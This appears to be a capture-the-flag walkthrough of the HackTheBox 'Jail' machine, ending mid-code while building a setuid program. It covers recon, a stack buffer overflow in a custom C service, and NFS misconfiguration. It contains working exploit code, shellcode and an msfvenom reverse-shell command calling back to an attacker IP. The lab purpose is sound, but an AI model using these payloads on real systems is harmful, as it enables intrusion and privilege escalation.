# Jail Writeup w/o Metasploit

![](https://miro.medium.com/max/596/1*7BBCOG265GIHQEeKoDY4TQ.png)

## Reconnaissance <a id="da1a"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.34 All
```

* **All**: Runs all the scans consecutively.

```text
Running all scans on 10.10.10.34Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 14:46 EDT
Nmap scan report for 10.10.10.34
Host is up (0.044s latency).
Not shown: 996 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
2049/tcp open  nfsNmap done: 1 IP address (1 host up) scanned in 6.21 seconds---------------------Starting Nmap Basic Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 14:47 EDT
Nmap scan report for 10.10.10.34
Host is up (0.043s latency).PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:ec:19:7c:da:dc:16:e2:a3:9d:42:f3:18:4b:e6:4d (RSA)
|   256 af:94:9f:2f:21:d0:e0:1d:ae:8e:7f:1d:7b:d7:42:ef (ECDSA)
|_  256 6b:f8:dc:27:4f:1c:89:67:a4:67:c5:ed:07:53:af:97 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind 2-4 (RPC #100000)
....
2049/tcp open  nfs_acl 3 (RPC #100227)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.43 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 14:47 EDT
Warning: 10.10.10.34 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.34
Host is up (0.038s latency).
Not shown: 952 open|filtered ports, 47 filtered ports
PORT    STATE SERVICE
111/udp open  rpcbindNmap done: 1 IP address (1 host up) scanned in 41.31 secondsMaking a script scan on UDP ports: 111
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 14:47 EDT
Nmap scan report for 10.10.10.34
Host is up (0.14s latency).PORT    STATE SERVICE VERSION
111/udp open  rpcbind 2-4 (RPC #100000)
....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 14:47 EDT
Initiating Parallel DNS resolution of 1 host. at 14:47
Completed Parallel DNS resolution of 1 host. at 14:47, 0.02s elapsed
Initiating SYN Stealth Scan at 14:47
Scanning 10.10.10.34 [65535 ports]
....
Nmap scan report for 10.10.10.34
Host is up (0.048s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
7411/tcp  open  daqstream
20048/tcp open  mountdRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 262.21 seconds
           Raw packets sent: 130962 (5.762MB) | Rcvd: 270 (19.244KB)Making a script scan on extra ports: 7411, 20048
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 14:52 EDT
Nmap scan report for 10.10.10.34
Host is up (0.039s latency).PORT      STATE SERVICE    VERSION
7411/tcp  open  daqstream?
....
20048/tcp open  mountd     1-3 (RPC #100005)
....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.53 seconds---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 14:54 EDT
Nmap scan report for 10.10.10.34
Host is up (0.063s latency).PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 6.6.1 (protocol 2.0)
80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))
|_http-server-header: Apache/2.4.6 (CentOS)
| vulners: 
|   cpe:/a:apache:http_server:2.4.6: 
|_      CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
111/tcp   open  rpcbind    2-4 (RPC #100000)
....
2049/tcp  open  nfs_acl    3 (RPC #100227)
7411/tcp  open  daqstream?
....
20048/tcp open  mountd     1-3 (RPC #100005)
....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 167.98 secondsRunning Vuln scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 14:57 EDT
Nmap scan report for 10.10.10.34
Host is up (0.26s latency).PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 6.6.1 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))
....
111/tcp   open  rpcbind    2-4 (RPC #100000)
....
2049/tcp  open  nfs_acl    3 (RPC #100227)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
7411/tcp  open  daqstream?
....
20048/tcp open  mountd     1-3 (RPC #100005)
....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 213.13 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.34:80 -o recon/gobuster_10.10.10.34_80.txt
nikto -host 10.10.10.34:80 | tee recon/nikto_10.10.10.34_80.txtWhich commands would you like to run?                                                                                                                                          
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.34:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/03/08 15:01:50 Starting gobuster
===============================================================
http://10.10.10.34:80/.hta (Status: 403) [Size: 206]
http://10.10.10.34:80/.hta.html (Status: 403) [Size: 211]
http://10.10.10.34:80/.hta.php (Status: 403) [Size: 210]
http://10.10.10.34:80/.htaccess (Status: 403) [Size: 211]
http://10.10.10.34:80/.htaccess.html (Status: 403) [Size: 216]
http://10.10.10.34:80/.htaccess.php (Status: 403) [Size: 215]
http://10.10.10.34:80/.htpasswd (Status: 403) [Size: 211]
http://10.10.10.34:80/.htpasswd.html (Status: 403) [Size: 216]
http://10.10.10.34:80/.htpasswd.php (Status: 403) [Size: 215]
http://10.10.10.34:80/cgi-bin/ (Status: 403) [Size: 210]
http://10.10.10.34:80/cgi-bin/.html (Status: 403) [Size: 215]
http://10.10.10.34:80/index.html (Status: 200) [Size: 2106]
http://10.10.10.34:80/index.html (Status: 200) [Size: 2106]
===============================================================
2020/03/08 15:04:14 Finished
===============================================================Finished gobuster scan
                                                                                                                                                                               
=========================
                                                                                                                                                                               
Starting nikto scan
                                                                                                                                                                               
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.34
+ Target Hostname:    10.10.10.34
+ Target Port:        80
+ Start Time:         2020-03-08 15:04:16 (GMT-4)
--------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ ERROR: Error limit (20) reached for host, giving up. Last error: 
+ Scan terminated:  0 error(s) and 6 item(s) reported on remote host
+ End Time:           2020-03-08 15:13:08 (GMT-4) (532 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                                                               
=========================
                                                                                                                                                                               
                                                                                                                                                                               
                                                                                                                                                                               
---------------------Finished all Nmap scans---------------------
```

We have 6 ports open.

* **Port 22:** running OpenSSH 6.6.1
* **Ports 80**: running Apache httpd 2.4.6
* **Port 111:** running rpcbind 2–4
* **Ports 2049:** running NFS
* **Port 20048:** running ****NFS mount daemon
* **Port 7411:** running daqstream

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The version of OpenSSH running on port 22 is not vulnerable to any RCE exploits, so it’s unlikely that we gain initial access through this service, unless we find credentials.
* The nikto and gobuster scans didn’t find any useful results for the web server running on port 80. So we might have to run more comprehensive scans.
* The ports for NFS are open. We’ll have to check if there is any mountable directories and the permissions set on those directories. This is the first machine I work on that has the NFS service open, so this will be interesting!
* Nmap was uncertain about the service categorization for port 7411. We’ll have to connect to it ourself using netcat and see the output that it gives us.

## Enumeration <a id="0ab0"></a>

I always start off with enumerating HTTP.

### Port 80 — HTTP <a id="51d2"></a>

Visit the application in the browser.

![](https://miro.medium.com/max/490/1*o1-Mbna25cSdQLMTX-DoMA.png)

Viewing the page source doesn’t give us anything useful. Let’s run a more comprehensive gobuster scan with a larger word list.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.10.34 -o gobuster-medium.txt
```

We get back the following result.

```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.34
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================                                                                                                                
2020/03/10 20:59:25 Starting gobuster                                                                                                                                          
===============================================================                                                                                                                
/jailuser (Status: 301)
===============================================================
2020/03/10 21:15:13 Finished
```

Visit the _/jailuser_ directory. There we find another directory called _/dev_.

![](https://miro.medium.com/max/620/1*N3HGgU1mLBJpzRfWBsYp1Q.png)

Download the files in the _/dev_ directory to the attack machine.

```text
wget --no-parent --reject "index.html*" -r http://10.10.10.34/jailuser/dev/
```

* **— no-parent:** do not ascend to the parent directory when retrieving recursively
* **— reject:** file name suffixes to reject
* **-r:** recursive

View the content of _compile.sh._

```text
gcc -o jail jail.c -m32 -z execstack
service jail stop
cp jail /usr/local/bin/jail
service jail start
```

The above script takes in the _jail.c_ file, compiles it and outputs the file _jail_. Then it starts up the service. Notice that while it is compiling the file it sets the flag _execstack_ which means that it is an executable stack. It’s very likely that we’re dealing with a buffer overflow here.

View the content of _jail.c_ file.

```text
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <time.h>int debugmode;
int handle(int sock);
int auth(char *username, char *password);int auth(char *username, char *password) {
    char userpass[16];
    char *response;
    if (debugmode == 1) {
        printf("Debug: userpass buffer @ %p\n", userpass);
        fflush(stdout);
    }                                                                                                                                                                          
    if (strcmp(username, "admin") != 0) return 0;                                                                                                                              
    strcpy(userpass, password);                                                                                                                                                
    if (strcmp(userpass, "1974jailbreak!") == 0) {                                                                                                                             
        return 1;                                                                                                                                                              
    } else {                                                                                                                                                                   
        printf("Incorrect username and/or password.\n");                                                                                                                       
        return 0;
    }
    return 0;
}int handle(int sock) {
    int n;
    int gotuser = 0;
    int gotpass = 0;
    char buffer[1024];
    char strchr[2] = "\n\x00";
    char *token;
    char username[256];
    char password[256];
    debugmode = 0;
    memset(buffer, 0, 256);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);
    printf("OK Ready. Send USER command.\n");
    fflush(stdout);
    while(1) {
        n = read(sock, buffer, 1024);
        if (n < 0) {
            perror("ERROR reading from socket");
            return 0;
        }
        token = strtok(buffer, strchr);
        while (token != NULL) {
            if (gotuser == 1 && gotpass == 1) {
                break;
            }
            if (strncmp(token, "USER ", 5) == 0) {
                strncpy(username, token+5, sizeof(username));
                gotuser=1;
                if (gotpass == 0) {
                    printf("OK Send PASS command.\n");
                    fflush(stdout);
                }
            } else if (strncmp(token, "PASS ", 5) == 0) {
                strncpy(password, token+5, sizeof(password));
                gotpass=1;
                if (gotuser == 0) {
                    printf("OK Send USER command.\n");
                    fflush(stdout);
                }
            } else if (strncmp(token, "DEBUG", 5) == 0) {
                if (debugmode == 0) {
                    debugmode = 1;
                    printf("OK DEBUG mode on.\n");
                    fflush(stdout);
                } else if (debugmode == 1) {
                    debugmode = 0;
                    printf("OK DEBUG mode off.\n");
                    fflush(stdout);
                }
            }
            token = strtok(NULL, strchr);
        }
        if (gotuser == 1 && gotpass == 1) {
            break;
        }
    }
    if (auth(username, password)) {
        printf("OK Authentication success. Send command.\n");
        fflush(stdout);
        n = read(sock, buffer, 1024);
        if (n < 0) {
            perror("Socket read error");
            return 0;
        }
        if (strncmp(buffer, "OPEN", 4) == 0) {
            printf("OK Jail doors opened.");
            fflush(stdout);
        } else if (strncmp(buffer, "CLOSE", 5) == 0) {
            printf("OK Jail doors closed.");
            fflush(stdout);
        } else {
            printf("ERR Invalid command.\n");
            fflush(stdout);
            return 1;
        }
    } else {
        printf("ERR Authentication failed.\n");
        fflush(stdout);
        return 0;
    }
    return 0;
}int main(int argc, char *argv[]) {
    int sockfd;
    int newsockfd;
    int port;
    int clientlen;
    char buffer[256];
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    int n;
    int pid;
    int sockyes;
    sockyes = 1;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        exit(1);
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &sockyes, sizeof(int)) == -1) {
        perror("Setsockopt error");
        exit(1);
    }
    memset((char*)&server_addr, 0, sizeof(server_addr));
    port = 7411;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind error");
        exit(1);
    }
    listen(sockfd, 200);
    clientlen = sizeof(client_addr);
    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr*)&client_addr, &clientlen);
        if (newsockfd < 0) {
            perror("Accept error");
            exit(1);
        }
        pid = fork();
        if (pid < 0) {
            perror("Fork error");
            exit(1);
        }
        if (pid == 0) {
            close(sockfd);
            exit(handle(newsockfd));
        } else {
            close(newsockfd);
        }
    }
}
```

We make note of a couple of things.

1. The program runs on port 7411 \(that’s the port that nmap was not able to identify\) and takes in as input a username and password. The input goes in the form of _USER &lt;username&gt;_ and _PASS &lt;password&gt;._
2. There are hardcoded credentials in the code: _admin/1974jailbreak!_. It doesn’t look like the application performs any useful functionality when using these credentials.
3. There is a debug option that outputs the memory address of the variable _userpass_.
4. The _userpass_ field is vulnerable to a buffer overflow. We can see that it is allocated 16 bytes, however no input validation is done on the strcpy function and we can input up to 256 bytes.

### Port **7411 — Jail** <a id="66f8"></a>

Let’s connect to the jail application and test out the credentials we found.

```text
root@kali:~# nc 10.10.10.34 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS 1974jailbreak!
OK Authentication success. Send command.
ls
ERR Invalid command.
```

It doesn’t look it really does anything useful. Let’s test out the debug mode.

```text
root@kali:~# nc 10.10.10.34 7411
OK Ready. Send USER command.
DEBUG
OK DEBUG mode on.
USER bla
OK Send PASS command.
PASS bla
Debug: userpass buffer @ 0xffffd610
ERR Authentication failed.
```

As mentioned earlier, it does give us the memory address for _userpass_ which is the buffer overflow-able parameter.

## Initial Foothold <a id="7dd9"></a>

To gain an initial foothold on the box, we’ll attempt to exploit the buffer overflow vulnerability.

**Step \#1: Crash the application \(fuzzing\)**

The first step is to prove that the application is vulnerable to a buffer overflow. This can be done by sending a large number of characters as an argument to the application until it crashes. This is known as fuzzing.

Since the buffer is set to 16, we’ll need to use a number of characters larger than 16. Let’s go with 40. Use python to generate a string of 40 As.

```text
root@kali:~# python -c 'print("A"*40)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Next, run the binary using GDB.

```text
gdb ./jail
```

Then hit run to execute the program.

```text
gef➤  run
Starting program: /root/Desktop/htb/jail/dev/10.10.10.34/jailuser/dev/jail
```

On a different tab, connect to the service.

```text
root@kali:~# nc localhost 7411
OK Ready. Send USER command.
```

Notice that we get a message in GDB telling us that the the process was detached after a fork from the child process. We can fix that by setting the following commands in GDB.

```text
gef➤  set follow-fork-mode child
gef➤  set detach-on-fork off
```

Now run the program again and connect to it using netcat.

```text
nc localhost 7411
```

We get the following output in GDB.

```text
gef➤  run
Starting program: /root/Desktop/htb/jail/dev/10.10.10.34/jailuser/dev/jail 
[Attaching after process 11091 fork to child process 11096]
[New inferior 2 (process 11096)]
```

Perfect, it’s working properly right now. Next, add the username and password parameters.

```text
root@kali:~# nc localhost 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

We get a segmentation fault in GDB.

![](https://miro.medium.com/max/911/1*y1iqyRbBWBA-ZXsQB3_Qsw.png)

Looking at the output, we can see that we successfully overwrote the EIP \(Extended Instruction Pointer\) / return address with 4 As, therefore, confirming that the application is vulnerable to buffer overflow.

**Step \#2: Determine the security protections that are enabled on the application**

This can be done using the “_checksec_” command.

![](https://miro.medium.com/max/788/1*XLr_yiipHhHyiLftc7bqKA.png)

We can see that PIE is enabled which stands for Position Independent Executable. This means that the memory locations will change every time you run the application. This makes exploiting buffer overflows harder. However, remember there was a DEBUG parameter that gave us the location of the buffer overflow-able field _userpass_. So we don’t have to worry about figuring out a way to find this memory address.

**Step \#3: Finding the offset**

In step \#1 we proved that we can overwrite the EIP by seeing that it was overwritten by a bunch of As. The next step is to find the exact memory address of the EIP. This can be done using **pattern create**.

```text
gef➤  pattern create 40
[+] Generating a pattern of 40 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
[+] Saved as '$_gef0'
```

Now perform step \#1 again with the above password string. Make sure to use the DEBUG option.

```text
root@kali:~# nc localhost 7411
OK Ready. Send USER command.
DEBUG
OK DEBUG mode on.
USER admin
OK Send PASS command.
PASS aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
Debug: userpass buffer @ 0xffffcb50
```

We get a segmentation error.

![](https://miro.medium.com/max/819/1*qKHysLMjaCbssOc3AUmNPg.png)

The EIP was overwritten with the string “haaa”. To find exact memory address of the EIP, use the following command.

```text
gef➤  pattern search 0x61616168
[+] Searching '0x61616168'
[+] Found at offset 28 (little-endian search) likely
[+] Found at offset 25 (big-endian search)
```

Perfect, the offset is 28.

**Step \#4: Finding Bad Characters**

I originally didn’t do this step which caused me a lot of wasted time and the reason for that will become obvious in the next couple of steps. Looking at the code, we see that the characters “\x00” and “\n” are bad characters. By default, the null byte “x00” is always considered a bad character. The issue we face is with the “\n” new line character which is represented by an A \(“\x0A”\) in hex. And an “A” in decimal is a “10”. See where the problem is?

Our kali machine IP address has a 10 in it so any shell code that contains a reverse shell back to our kali machine will not work.

**Step \#5: Generating Shell code**

The next step would be to generate the reverse shell code. Again, I hadn’t enumerated the bad characters when I first tried to solve this box and therefore I used the following msfvenom command to send a reverse shell back to my attack machine.

```text
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.45 LPORT=1234 -f py
```

This gave me the following output.

```text
buf =  b""
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
buf += b"\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a"
buf += b"\x0a\x0e\x2d\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50"
buf += b"\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73"
buf += b"\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0"
buf += b"\x0b\xcd\x80"
```

Notice the “\x0a” added for my ip address that caused my exploit not to work. To bypass that restriction we’ll make use of [socket reuse](https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/). We can simply grab the [socket reuse shellcode on exploitdb](https://www.exploit-db.com/exploits/34060) instead of having to write our own.

```text
shellcode[]=
"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\xcd\x80";
```

**Step \#6: Writing out the Exploit**

We have all the necessary information we need to write out our exploit. I use pwn tools to automate the process.

```text
from pwn import *# initial configuration
context(os="linux", arch="i386")
host = "localhost"
port = "7411"# offset, junk to get to the EIP
junk = "A" * 28# userpass leaked memory address
memory_add = p32(0xff802090+32)# socket reuse shell code 
buf = ""
buf += "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
buf += "\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
buf += "\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
buf += "\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
buf += "\x89\xe3\x31\xc9\xcd\x80"# connection
p = remote(host,port)
p.recvuntil("OK Ready. Send USER command.")
p.sendline("DEBUG")
p.recvuntil("OK DEBUG mode on.")
p.sendline("USER admin")
p.recvuntil("OK Send PASS command.")
p.sendline("PASS " + junk + memory_add +  buf)p.interactive()
```

Run the exploit and we get a shell!

```text
root@kali:~/Desktop/htb/jail# python jail.py
[+] Opening connection to localhost on port 7411: Done
[*] Switching to interactive modeDebug: userpass buffer @ 0xff802090
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Now to test it on the Jail box, change the _host_ to the ip address of Jail and the _memory\_add_ to the one that gets leaked when you connect to the jail application.

```text
root@kali:~/Desktop/htb/jail# python jail-prod.py 
[+] Opening connection to 10.10.10.34 on port 7411: Done
[*] Switching to interactive modeDebug: userpass buffer @ 0xffffd610
$ id
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```

We’re in!

## Privilege Escalation <a id="e94b"></a>

Setting the difficulty of this box to **Insane** was not an overstatement. In order to root the box, we’ll have to pivot to two other users before we can escalate our privileges to root.

### nobody -&gt; frank <a id="db13"></a>

Let’s first upgrade our non-interactive shell to a partially interactive one.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

Next, visit the home directory and view the permissions on the content of the directory.

```text
bash-4.2$ cd home
cd homebash-4.2$ ls -la
ls -la
total 4
drwxr-xr-x.  3 root  root    19 Jun 25  2017 .
dr-xr-xr-x. 17 root  root   224 Jun 25  2017 ..
drwx------. 17 frank frank 4096 Jun 28  2017 frank
```

The _user.txt_ flag is probably in the frank directory. However, as stated by the permissions set on the directory, only the owner frank can view the content of the directory.

Next, let’s learn more about the OS.

```text
bash-4.2$ uname -a
uname -a
Linux localhost.localdomain 3.10.0-514.26.1.el7.x86_64 #1 SMP Thu Jun 29 16:05:25 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

View the list of allowed sudo commands the user can run.

![](https://miro.medium.com/max/1110/1*1JOWE853U8kjvgxJ2JLKZw.png)

We’re allowed to run the _logreader.sh_ file as the user frank without having to enter frank’s password.

View the permissions on the directory.

```text
bash-4.2$ ls -la /opt | grep logreader
ls -la /opt | grep logreader
drwxr-x---+  2 root root  26 Jun 26  2017 logreader
```

We don’t have any permissions. Next, let’s run the _logreader.sh_ file.

```text
sudo -u frank /opt/logreader/logreader.sh
checkproc[1583910001]: 145
checkproc[1583910301]: 145
checkproc[1583910601]: 145
checkproc[1583910901]: 146
checkproc[1583911201]: 146
checkproc[1583911501]: 145
checkproc[1583911801]: 145
checkproc[1583912101]: 145
checkproc[1583912402]: 144
checkproc[1583912701]: 145
....
```

We don’t get anything useful. Let’s move on. The nmap scan showed that the NFS ports were open and we never enumerated that service.

Going back to the attack machine, we can enumerate NFS services using NSE scripts.

![](https://miro.medium.com/max/1387/1*L7JMfWmbOTlJfcI_F8E18w.png)

Run the NSE scripts.

```text
nmap -p 111 --script nfs* 10.10.10.34
```

We get back the following result.

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 21:31 EDT
Nmap scan report for 10.10.10.34
Host is up (0.056s latency).PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /opt
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    33    2017-06-26T00:00:59  .
| r-xr-xr-x   0    0    224   2017-06-25T10:43:12  ..
| rwxr-x---   0    0    26    2017-06-26T13:50:21  logreader
| rwxr-xr-x   0    0    6     2015-03-26T13:22:14  rh
|_
| nfs-showmount: 
|   /opt *
|_  /var/nfsshare *Nmap done: 1 IP address (1 host up) scanned in 5.16 seconds
```

We can also enumerate this manually using the _showmount_ command.

```text
root@kali:~/Desktop/htb/jail/nfs# showmount -e 10.10.10.34                                                  
Export list for 10.10.10.34:                                                                                
/opt          *                                                                                                                            
/var/nfsshare *
```

As shown above, we have two folders that we can mount to our attack machine. First create the directories _opt_ and _var_.

```text
mkdir opt
mkdir var
```

Next, mount the NFS directories.

```text
mount -t nfs 10.10.10.34:/opt opt
mount -t nfs 10.10.10.34:/var/nfsshare var
```

Let’s view the permissions on the directories.

```text
root@kali:~/Desktop/htb/jail/nfs# ls -la
total 8
drwxr-xr-x 4 root root 4096 Mar 10 23:18 .
drwxr-xr-x 7 root root 4096 Mar 11 01:49 ..
drwxr-xr-x 4 root root   33 Jun 25  2017 opt
drwx-wx--x 2 root 1000   77 Mar 11 09:37 var
```

The _opt_ directory can be read and executed by anybody. View the content and permissions of the files in the _opt_ directory.

```text
root@kali:~/Desktop/htb/jail/nfs# cd opt
root@kali:~/Desktop/htb/jail/nfs/opt# ls -la
total 4
drwxr-xr-x 4 root root   33 Jun 25  2017 .
drwxr-xr-x 4 root root 4096 Mar 10 23:18 ..
drwxr-x--- 2 root root   26 Jun 26  2017 logreader
drwxr-xr-x 2 root root    6 Mar 26  2015 rh
```

We see the _logreader_ directory that contains the _logreader.sh_ file that we can execute as frank without a password. Let’s try and enter the directory.

```text
root@kali:~/Desktop/htb/jail/nfs/opt# cd logreader
bash: cd: logreader: Permission deniedroot@kali:~/Desktop/htb/jail/nfs/opt# id
uid=0(root) gid=0(root) groups=0(root)
```

We get a permission denied although our attack machine is running with the _root_ id. This leads us to believe that root squashing is in place, which is default configuration for NFS. So not at all surprising. We’ll confirm that in a bit on the target machine.

As for the _var_ directory, we only have execute permissions on it. However, the user id 1000 has write and execute privileges on the directory.

Let’s go back to the target machine and see which user has the 1000 user id.

```text
bash-4.2$ cat /etc/passwd | grep 1000
cat /etc/passwd | grep 1000
frank:x:1000:1000:frank:/home/frank:/bin/bash
```

It’s associated to the frank user. Next, let’s view the permissions set on the NFS share.

```text
bash-4.2$ cat /etc/exports
cat /etc/exports
/var/nfsshare *(rw,sync,root_squash,no_all_squash)
/opt *(rw,sync,root_squash,no_all_squash)
```

The configuration for both directories is the same.

* Read and write privileges
* The setting _root\_squash_ is configured which maps all requests from uid/gid 0 to the anonymous uid/gid. This is why we weren’t able to view the files although the attack machine was running with the uid/gid 0. When we made the request to view the file, our id got mapped to the anonymous id and our request got rejected.
* More interestingly, the _no\_all\_squash_ setting is configured which does NOT map all the requests from other uids/gids to the anonymous uid/gid. This again is the default setting for NFS shares.

To sum up, we can assume the identity of any user on the attack machine except for the root user which automatically gets mapped to the anonymous user.

Going back to the permissions on the NFS directories.

```text
Let’s view the permissions on the directories.root@kali:~/Desktop/htb/jail/nfs# ls -la
total 8
drwxr-xr-x 4 root root 4096 Mar 10 23:18 .
drwxr-xr-x 7 root root 4096 Mar 11 01:49 ..
drwxr-xr-x 4 root root   33 Jun 25  2017 opt
drwx-wx--x 2 root 1000   77 Mar 11 09:37 var
```

The id 1000 \(frank\) has write and execute privileges on the _var_ directory. So what we’ll do is add the user frank on our kali machine and change his id to 1000.

```text
root@kali:~/Desktop/htb/jail/nfs# useradd frankroot@kali:~/Desktop/htb/jail/nfs# cat /etc/passwd | grep frank
frank:x:1000:1000::/home/frank:/bin/sh
```

Now we can enter the _var_ directory.

```text
root@kali:~/Desktop/htb/jail/nfs# cd var
root@kali:~/Desktop/htb/jail/nfs/var#
```

So the attack vector is as follows. We have write privileges on the _var_ directory. Therefore, what we’ll do is create a setuid program file in the var directory with the privileges of the frank user we just created. Next, we’ll execute the setuid program in the target machine and since it has the setuid bit set and the owner is frank, we should be able to pivot from the nobody user to the frank user.

Let’s first change our user to the frank user.

```text
root@kali:~/Desktop/htb/jail/nfs/var# su frank
```

Next, create a file _setuid.c_ with the following content.

```text
#include <unistd.h>
int main()
{
    setreuid(1000,1000);
